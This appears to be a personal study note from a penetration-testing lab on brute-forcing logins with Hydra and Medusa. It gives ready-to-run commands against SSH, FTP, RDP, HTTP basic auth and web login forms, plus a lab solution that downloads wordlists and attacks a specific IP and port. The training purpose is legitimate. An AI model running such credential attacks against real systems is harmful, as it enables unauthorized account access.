---
tags:
  - BruteForcing
  - Medusa
  - Hydra
  - netstat
---


Credential Stuffing: Leveraging Stolen Data for Unauthorized Access 
![[Pasted image 20250405174223.png]]

Using hydra 

```bash 
hydra [login_options] [password_options] [attack_options] [service_options]

# Trying to find credentials for a specific service
hydra -L usernames.txt -P passwords.txt www.example.com http-get

# Trying to simulatenously check multiple targets for an existing login 
hydra -l root -p toor -M targets.txt ssh

# Assessing non-standard port access 
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# Using hydra to login via webform 
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS:S=302"

# Advanced RDP Brute forcing 
# This tests for the username administrator and tries to brute force a password ranging from 6-8 characters using speified character set 
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

# Cracking Basic HTTP Authentication 
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

```


## About Login Forms 

- Hydra has the http-post-form module for that 
```bash
hydra [options] target http-post-form "path:params:condition_string"

# Example on how to use the failure condition
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"


# Solving the Challenge 

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.55.234 -s 44364 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```



## Using Medusa for Brute Forcing 


```bash
medusa [target_options] [credential_options] -M module [module_options]
```

![[Pasted image 20250407124241.png]]

Using Medusa to login to the system 

```bash 
# -t is for parallel threads
medusa -h <IP> -n <PORT> -U SSHUSER -p some_passwordlist.txt -M ssh -t 3

# After login, try to check the attack surface 
netstat -tulpn | grep LISTEN

```